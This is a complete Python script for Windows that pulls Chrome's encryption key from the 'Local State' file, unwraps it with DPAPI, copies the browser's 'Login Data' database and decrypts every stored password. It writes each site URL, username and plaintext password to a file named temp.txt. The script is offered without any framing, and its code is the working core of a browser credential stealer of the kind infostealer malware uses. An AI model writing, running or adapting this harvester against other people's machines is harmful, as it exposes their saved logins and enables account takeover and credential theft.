import os
import sqlite3
import shutil
import json
import base64
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Function to get the local state encryption key
def get_encryption_key():
    local_state_path = os.path.join(
        os.getenv('LOCALAPPDATA'),
        r'Google\Chrome\User Data\Local State'
    )
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.load(file)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove DPAPI header
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Function to decrypt the password using the encryption key
def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        aes_gcm = AESGCM(key)
        return aes_gcm.decrypt(iv, payload, None).decode('utf-8')
    except Exception as e:
        return f"Unable to decrypt: {str(e)}"

# Main function to extract and save passwords
def save_chrome_passwords():
    # Path to Chrome's Login Data database
    db_path = os.path.join(
        os.getenv('LOCALAPPDATA'),
        r'Google\Chrome\User Data\Default\Login Data'
    )
    temp_db = "temp_LoginData.db"
    
    # Copy database to a temp location to avoid lock issues
    shutil.copyfile(db_path, temp_db)

    # Connect to the database
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()

    # Query to fetch login information
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    # Get encryption key
    encryption_key = get_encryption_key()

    # Save passwords to temp.txt
    with open("temp.txt", "w", encoding="utf-8") as file:
        file.write("URL, Username, Password\n")
        for row in cursor.fetchall():
            origin_url = row[0]
            username = row[1]
            encrypted_password = row[2]
            password = decrypt_password(encrypted_password, encryption_key)
            file.write(f"{origin_url}, {username}, {password}\n")

    # Close database connection and cleanup
    conn.close()
    os.remove(temp_db)
    print("Passwords saved to temp.txt")

# Run the function
if __name__ == "__main__":
    save_chrome_passwords()
